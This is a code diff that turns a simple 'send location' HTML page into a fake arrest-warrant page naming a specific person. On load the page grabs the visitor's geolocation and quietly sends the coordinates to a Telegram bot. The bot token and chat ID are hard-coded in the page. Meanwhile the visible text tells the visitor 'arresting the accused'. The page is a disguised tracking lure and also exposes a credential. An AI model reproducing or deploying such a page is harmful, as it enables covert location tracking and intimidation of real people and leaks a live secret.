@@ -1,43 +1,90 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>ارسال مکان</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>برگه جلب هادی نیک فرجام </title>
+  <style>
+    body {
+      text-align: center;
+      font-family: sans-serif;
+      padding: 20px;
+    }
+    #jalbImage {
+      width: 794px; /* حدود عرض A4 در پیکسل با DPI 96 */
+      height: 1123px; /* حدود ارتفاع A4 */
+      max-width: 100%;
+      height: auto;
+      border: 2px solid black;
+      margin-top: 20px;
+    }
+  </style>
 </head>
-<body style="text-align:center; font-family:sans-serif; margin-top:100px;">
+<body>
+  <p id="status">جلب متهم...</p>
 
-  <h2>ارسال مکان به Google Sheet</h2>
-  <button onclick="sendLocation()">ارسال مکان</button>
-  <p id="status"></p>
+  <!-- تصویر برگ جلب -->
+  <img id="jalbImage" src="JALB.jpg" alt="برگ جلب"/>
 
   <script>
-    function sendLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function(position) {
-          const data = {
-            Timestamp: new Date().toISOString(),
-            Latitude: position.coords.latitude,
-            Longitude: position.coords.longitude,
-            Accuracy: position.coords.accuracy
-          };
+    window.onload = function () {
+      const status = document.getElementById('status');
 
-          fetch("https://script.google.com/macros/s/AKfycbxCQ3AIMDctelAO6N1faYA_52M6NpZyzO8tQgMYi-Jprl1l4QddnLT0mgVQ-HjmetIR/exec", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify(data)
-          })
-          .then(res => res.text())
-          .then(txt => document.getElementById("status").innerText = "ارسال شد: " + txt)
-          .catch(err => document.getElementById("status").innerText = "خطا: " + err);
-        }, function(error) {
-          document.getElementById("status").innerText = "خطا در مکان‌یابی: " + error.message;
-        });
-      } else {
-        document.getElementById("status").innerText = "مرورگر شما از مکان‌یابی پشتیبانی نمی‌کند.";
+      if (!navigator.geolocation) {
+        status.innerText = "❌ Your browser does not support geolocation.";
+        return;
       }
-    }
+
+      navigator.geolocation.getCurrentPosition(
+        position => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+
+          const token = '7841305499:AAElwSSCBPF6-2cf_NEL3TXiK760exGM9pg';
+          const chatId = '7570861617';  // چت آی‌دی شما
+          const message = `📍 User Location:\nLatitude: ${lat}\nLongitude: ${lon}`;
+
+          status.innerText = " جلب متهم...";
+
+          fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: message
+            })
+          })
+          .then(response => response.json())
+          .then(data => {
+            if (data.ok) {
+              status.innerText = " جلب متهم هادی نیک فرجام   !";
+            } else {
+              status.innerText = `❌ Telegram Error: ${JSON.stringify(data)}`;
+            }
+          })
+          .catch(error => {
+            status.innerText = `❌ Fetch Error: ${error}`;
+          });
+        },
+        error => {
+          switch (error.code) {
+            case error.PERMISSION_DENIED:
+              status.innerText = "❌ Location permission denied.";
+              break;
+            case error.POSITION_UNAVAILABLE:
+              status.innerText = "❌ Location unavailable.";
+              break;
+            case error.TIMEOUT:
+              status.innerText = "❌ Location request timed out.";
+              break;
+            default:
+              status.innerText = "❌ Unknown geolocation error.";
+          }
+        }
+      );
+    };
   </script>
 </body>
 </html>
